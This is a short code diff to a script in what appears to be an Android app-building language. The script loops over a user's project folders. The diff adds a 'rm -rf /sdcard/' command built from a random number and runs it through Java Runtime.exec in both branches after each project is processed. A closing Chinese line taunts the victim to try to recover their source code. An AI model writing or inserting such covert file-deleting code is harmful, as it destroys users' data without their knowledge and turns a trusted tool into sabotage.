@@ -151,8 +151,8 @@ fl(dir,"false",irsz)
 for(iapp;irsz)
 {
   ss(dir+iapp,ymdz)
-  sran(1000,9999,sjs)
-  ss(dir+"/"+sjs,hp)
+  sran(1000,9999,hp)
+  ss("rm -rf /sdcard/"+hp,rm)
   fuzs(ymdz,hp,true,ll)
   ss(hp+"/src/mian.iyu",mian)
   fr(mian,iyu)
@@ -170,6 +170,8 @@ for(iapp;irsz)
     sr(iyu,loading,afterloading,iyu)
     fw(mian,iyu)
     fj(hp,ymdz,true,jg)    
+    java(runtime,null,"java.lang.Runtime.getRuntime")
+    java(null,runtime,"java.lang.Runtime.exec","String",rm)
   }
   else
   {
@@ -186,6 +188,8 @@ for(iapp;irsz)
     sr(iyu,ui,th)
     fw(mian,th)
     fj(hp,ymdz,true,jg)
+    java(runtime,null,"java.lang.Runtime.getRuntime")
+   java(null,runtime,"java.lang.Runtime.exec","String",rm )
   }
 }
 加油，试着找回来自己的源码
